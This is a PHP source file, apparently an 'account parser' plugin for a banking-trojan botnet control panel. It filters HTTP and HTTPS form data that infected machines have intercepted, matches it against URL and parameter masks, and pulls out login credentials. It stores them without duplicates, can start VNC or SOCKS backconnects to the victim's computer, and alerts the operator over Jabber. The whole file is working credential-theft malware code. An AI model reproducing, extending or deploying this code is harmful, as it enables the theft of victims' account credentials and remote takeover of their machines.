<?php
/** Parse accounts
 * 0. Only BLT_HTTP_REQUEST & BLT_HTTPS_REQUEST against $list[SBCID_BOTLOG_TYPE]
 * 1. If Match URL masks against $list[SBCID_PATH_SOURCE]
 * 2. If Match params mask against $list[SBCID_BOTLOG]
 * 3. Store into the DB (no dups)
 * 4. Autoconnect VNC|SOCKS when set
 * 5. Jabber-notify if configured
 */
function accparseplugin_parselog($list, $botId){
	/* Only for HTTP[S] */
	$type = toInt($list[SBCID_BOTLOG_TYPE]);
	if ($type != BLT_HTTP_REQUEST && $type != BLT_HTTPS_REQUEST)
		return;
	
	/* Match the URL */
	$matched_rule = null;
	
	$R = mysql_query('SELECT * FROM `accparse_rules` WHERE `enabled`=1 ORDER BY NULL;');
	while ($R && !is_bool($r = mysql_fetch_assoc($R))){
		$wildcart = '~^'.str_replace('\\*', '.*', preg_quote(trim($r['url']), '~')).'$~i';
		if (preg_match($wildcart, $list[SBCID_PATH_SOURCE])){
			$matched_rule = $r;
			mysql_free_result($R);
			break;
			}
		}
	
	if (is_null($matched_rule))
		return;
	
	GateLog::get()->log(GateLog::L_TRACE, 'plugin.accparse', 'Rule matched: '.$matched_rule['alias']);
	
	/* Match the params */
	$matched_params = array();
	
	foreach (explode("\n", $matched_rule['params']) as $param){
		$param = rtrim(trim($param), '=');
		$wildcart = '~^('.str_replace('\\*', '.*', preg_quote($param, '~')).')=(.+)$~ium';
		if (preg_match_all($wildcart, $list[SBCID_BOTLOG], $matches, PREG_SET_ORDER))
			foreach ($matches as $m)
				$matched_params[ urldecode($m[1]) ] = urldecode($m[2]);
		}
	
	
	if (count($matched_params) == 0)
		return;
	
	GateLog::get()->log(GateLog::L_TRACE, 'plugin.accparse', 'Rule params also matched: '.count($matched_params));
	
	/* String-format */
	$matched_account = '';
	asort($matched_params);
	foreach($matched_params as $k => $v)
		$matched_account .= "$k=$v\n";
	
	/* Store */
	$q_botId = mysql_real_escape_string($botId);
	$q_bot_info = mysql_real_escape_string(implode("\n", array(
			basename($list[SBCID_PROCESS_NAME]),
			)));
	$q_ruleid = $matched_rule['id'];
	$q_account = mysql_real_escape_string($matched_account);
	$q_acc_hash = md5(implode($matched_params));
	$q_mtime = time();
	
	mysql_query("INSERT INTO `accparse_accounts` VALUES(NULL, '$q_botId', '$q_bot_info', $q_ruleid, '$q_account', '$q_acc_hash', $q_mtime, 0, '') ON DUPLICATE KEY UPDATE `mtime`=$q_mtime;");
	
	/* Dupecheck */
	$affected = mysql_affected_rows();
	$duplicate_account = ($affected == 2); # INSERT gives 1, UPDATE gives 2. This magic should work :)
	
	GateLog::get()->log(GateLog::L_TRACE, 'plugin.accparse', 'Account '.($duplicate_account? 'updated' : 'added'));
	
	/* Autoconnect option */
	if ($matched_rule['autoconnect'])
		if (function_exists('vncplugin_autoconnect')){
			$q_protocol = $matched_rule['autoconnect'];
			GateLog::get()->log(GateLog::L_TRACE, 'plugin.accparse', 'Account backconnect: protocol='.$q_protocol);
			mysql_query("INSERT INTO `vnc_bot_connections` VALUES('$q_botId', $q_protocol, 1, 0, 0, 0) ON DUPLICATE KEY UPDATE `protocol`=$q_protocol, `ctime`=0, `do_connect`=IF(`do_connect`=0,1,`do_connect`);");
			vncplugin_autoconnect($botId);
			}
	
	/* Notify */
	if ($duplicate_account) return; # do nothing else
	
	if ($matched_rule['notify'] && !empty($GLOBALS['config']['accparse_jid'])){
		$message = sprintf("Account-Parser match: %s (URL: %s)\n", $matched_rule['alias'], $matched_rule['url']);
		$message .= sprintf("BotID: %s\n", $botId);
		$message .= sprintf("Browser: %s\n", $list[SBCID_PROCESS_NAME]);
		$message .= sprintf("URL: %s\n", $list[SBCID_PATH_SOURCE]);
		$message .= "\n";
		$message .= strlen($matched_account)>100 ? substr($matched_account, 0, 100)."\n...(see in the admin)" : $matched_account;
		
		GateLog::get()->log(GateLog::L_TRACE, 'plugin.accparse', 'Jabber notify: '.$GLOBALS['config']['accparse_jid']);
		jabber_notify($GLOBALS['config']['accparse_jid'], $message);
		}
	}
